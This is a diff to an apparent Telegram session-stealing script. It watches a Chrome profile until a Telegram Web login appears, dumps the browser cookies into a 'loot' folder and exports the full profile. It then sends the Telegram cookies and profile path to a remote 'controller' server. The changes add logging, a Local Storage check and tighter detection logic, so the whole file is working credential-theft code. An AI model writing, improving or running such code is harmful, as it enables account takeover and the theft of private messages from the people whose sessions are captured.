@@ -154,10 +154,14 @@ def send_to_controller(data_type, data):
 def main():
     global session_captured
     
-    print(f"[TG Monitor] Waiting for Telegram login...")
-    print(f"[TG Monitor] Profile: {CHROME_PROFILE}")
+    print(f"[TG Monitor] Starting...", flush=True)
+    print(f"[TG Monitor] Profile: {CHROME_PROFILE}", flush=True)
+    print(f"[TG Monitor] Controller: {CONTROLLER_URL}", flush=True)
+    print(f"[TG Monitor] Session ID: {SESSION_ID}", flush=True)
     
     (LOOT_DIR / SESSION_ID).mkdir(parents=True, exist_ok=True)
+    
+    check_count = 0
     
     while True:
         try:
@@ -165,26 +169,42 @@ def main():
                 time.sleep(10)
                 continue
             
+            check_count += 1
+            
             cookies = get_chrome_cookies()
             tg_cookies = check_telegram_session(cookies)
             
-            # Telegram Web stores session in IndexedDB, check if we have data
+            # Check Local Storage for Telegram auth
+            ls_path = CHROME_PROFILE / "Local Storage" / "leveldb"
+            has_local_storage = False
+            if ls_path.exists():
+                ls_size = sum(f.stat().st_size for f in ls_path.rglob('*') if f.is_file())
+                if ls_size > 5000:  # Has some data
+                    has_local_storage = True
+            
+            # Telegram Web stores session in IndexedDB
             idb_path = CHROME_PROFILE / "IndexedDB"
             has_telegram_idb = False
             
             if idb_path.exists():
                 for item in idb_path.iterdir():
                     if "telegram" in item.name.lower():
-                        # Check if it has actual data (not just empty)
                         size = sum(f.stat().st_size for f in item.rglob('*') if f.is_file())
-                        if size > 1000:  # More than 1KB = likely has session
+                        print(f"[TG Monitor] Found Telegram IDB: {item.name}, size: {size}", flush=True)
+                        if size > 1000:
                             has_telegram_idb = True
                             break
             
-            # We have a session if we have Telegram cookies OR IndexedDB data
-            if (len(tg_cookies) > 0 or has_telegram_idb) and not session_captured:
-                print(f"[TG Monitor] SESSION DETECTED!")
-                print(f"[TG Monitor] Cookies: {len(tg_cookies)}, IndexedDB: {has_telegram_idb}")
+            # Log status every 10 checks
+            if check_count % 10 == 0:
+                print(f"[TG Monitor] Check #{check_count}: cookies={len(cookies)}, tg_cookies={len(tg_cookies)}, idb={has_telegram_idb}, ls={has_local_storage}", flush=True)
+            
+            # Detect session: Telegram cookies OR IndexedDB with data OR significant LocalStorage
+            session_detected = (len(tg_cookies) > 0 or has_telegram_idb) and has_local_storage
+            
+            if session_detected and not session_captured:
+                print(f"[TG Monitor] *** SESSION DETECTED! ***", flush=True)
+                print(f"[TG Monitor] Cookies: {len(tg_cookies)}, IndexedDB: {has_telegram_idb}", flush=True)
                 
                 session_captured = True
                 
@@ -192,22 +212,25 @@ def main():
                 cookies_file = LOOT_DIR / SESSION_ID / "cookies.json"
                 with open(cookies_file, "w") as f:
                     json.dump(cookies, f, indent=2)
+                print(f"[TG Monitor] Saved cookies to {cookies_file}", flush=True)
                 
                 # Export full session
                 profile_path = export_session()
+                print(f"[TG Monitor] Exported profile to {profile_path}", flush=True)
                 
-                # Send ONE alert to controller
-                send_to_controller("telegram_session", {
+                # Send alert to controller
+                result = send_to_controller("telegram_session", {
                     "cookies": tg_cookies,
                     "cookie_count": len(tg_cookies),
                     "has_indexeddb": has_telegram_idb,
                     "profile_path": profile_path
                 })
-                
-                print(f"[TG Monitor] Session exported to {profile_path}")
+                print(f"[TG Monitor] Sent to controller: {result}", flush=True)
         
         except Exception as e:
-            print(f"[TG Monitor] Error: {e}", file=sys.stderr)
+            print(f"[TG Monitor] Error: {e}", file=sys.stderr, flush=True)
+            import traceback
+            traceback.print_exc()
         
         time.sleep(CHECK_INTERVAL)
 
